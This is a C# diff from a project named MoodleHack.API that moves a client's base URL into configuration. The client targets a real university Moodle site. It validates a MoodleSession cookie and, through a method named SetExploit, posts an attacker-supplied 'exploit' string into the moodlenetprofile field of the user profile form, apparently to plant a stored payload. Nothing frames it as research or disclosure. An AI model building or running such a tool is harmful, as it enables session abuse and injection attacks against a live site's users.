@@ -2,22 +2,24 @@
 using System.Collections.Generic;
 using System.Net.Http;
 using System.Threading.Tasks;
+using Microsoft.Extensions.Configuration;
 
 namespace MoodleHack.API.Services
 {
     public class SdoApiClient : IDisposable
     {
-        public const string BaseEndpoint = "https://online-edu.mirea.ru/";
+        private static string _baseEndpoint;
         private readonly HttpClient _httpClient;
 
-        public SdoApiClient()
+        public SdoApiClient(IConfiguration configuration)
         {
+            _baseEndpoint = configuration["BaseUrl"];
             _httpClient = new HttpClient();
         }
 
         public async Task<bool> Validate(string moodleSession)
         {
-            var url = BaseEndpoint + "/user/edit.php";
+            var url = _baseEndpoint + "/user/edit.php";
             var request = new HttpRequestMessage
             {
                 Method = HttpMethod.Get,
@@ -30,7 +32,7 @@ namespace MoodleHack.API.Services
         }
         public async Task<bool> SetExploit(string moodleSession, string exploit)
         {
-            var url = BaseEndpoint + "/user/edit.php";
+            var url = _baseEndpoint + "/user/edit.php";
             var dict = new Dictionary<string, string>()
             {
                 ["moodlenetprofile"]= exploit
